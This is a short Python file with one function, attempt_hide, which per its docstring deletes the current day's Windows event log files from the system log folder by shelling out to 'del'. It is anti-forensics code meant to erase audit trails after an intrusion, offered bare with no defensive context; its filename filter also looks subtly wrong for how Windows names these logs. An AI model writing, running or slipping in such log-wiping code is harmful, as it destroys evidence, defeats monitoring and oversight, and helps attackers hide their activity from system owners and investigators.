import datetime
import subprocess
import os
import sys


def attempt_hide():
    """
    Attempts to delete Windows event logs from the current day.

    Parameters:
    None

    Returns:
    None
    """
    today = datetime.date.today()
    log_path = r"C:\Windows\System32\winevt\Logs"

    for file in os.listdir(log_path):
        if file.endswith(".evtx") and file.startswith(today.strftime("%Y-%m-%d")):
            subprocess.run(f'del "{os.path.join(log_path, file)}"', shell=True)
